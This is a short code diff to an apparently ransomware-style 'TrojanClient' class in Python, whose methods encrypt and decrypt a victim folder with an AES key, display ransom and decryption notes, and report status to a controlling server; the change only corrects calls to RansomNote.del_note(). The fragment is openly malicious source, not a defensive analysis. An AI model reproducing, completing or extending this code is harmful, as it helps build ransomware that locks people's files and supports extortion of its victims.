@@ -129,14 +129,14 @@ class TrojanClient:
         FileEncryptor.encrypt_folder(self.folder, aes_key)
         del aes_key
         RansomNote.display_encryption_note()
-        del_note()
+        RansomNote.del_note()
         protocol.send(self.connection, "the files are encrypted")
     
     def decryption(self, aes_key):
         FileEncryptor.decrypt_folder(self.folder, aes_key)
         del aes_key
         RansomNote.display_decryption_note()
-        del_note()
+        RansomNote.del_note()
         protocol.send(self.connection, "the files are decrypted")
 
     def handle_server(self):
